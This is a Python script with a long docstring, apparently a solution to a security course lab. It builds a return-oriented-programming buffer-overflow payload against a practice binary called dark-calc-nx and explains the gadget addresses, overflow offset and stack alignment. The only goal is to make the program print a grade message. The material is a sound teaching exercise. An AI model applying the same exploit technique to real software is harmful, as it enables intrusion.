#!/usr/bin/env python3
"""Task 3: return-oriented-programming exploit for attack/dark-calc-nx.

Goal: make dark-calc-nx print "Hope A will be your grade!" using only gadgets
that already exist in the executable's (non-randomized) .text section.

dark-calc-nx is a non-PIE binary with a non-executable, ASLR-randomized stack,
so shellcode cannot run and stack addresses are unknown.  Instead we build a
small ROP chain out of the `__libc_csu_init` epilogue, whose tail bytes are:

    401a32: 41 5f        pop    %r15
    401a34: c3           ret

Jumping one byte in, at 0x401a33 we get the bytes `5f c3`:

    5f      pop %rdi
    c3      ret

and 0x401a34 is a bare `ret`.

Gadgets used
------------
    pop_rdi_ret = 0x401a33   (pop rdi; ret)
    ret_gadget  = 0x401a34   (ret)
    grade_eval  = 0x401978

Chain layout (after the 24 bytes that overflow expression[] + saved rbp):

    pop rdi; ret   ->  rdi = 4
    4              ->  (grade argument)
    ret            ->  extra ret re-aligns the stack to 16 bytes so printf
                       inside grade_eval does not crash on a movaps
    grade_eval     ->  prints "Hope A will be your grade!"

grade_eval(4) prints the string and calls fflush(stdout), so the message is
already on stdout even though the chain has no clean continuation after it.
"""
import sys

pop_rdi_ret = 0x401A33
ret_gadget = 0x401A34
grade_eval = 0x401978

# overflow: 16-byte expression buffer + 8-byte saved rbp = 24 bytes
payload = b"A" * 24
payload += pop_rdi_ret.to_bytes(8, "little")
payload += (4).to_bytes(8, "little")
payload += ret_gadget.to_bytes(8, "little")  # stack alignment for printf
payload += grade_eval.to_bytes(8, "little")

sys.stdout.buffer.write(payload)
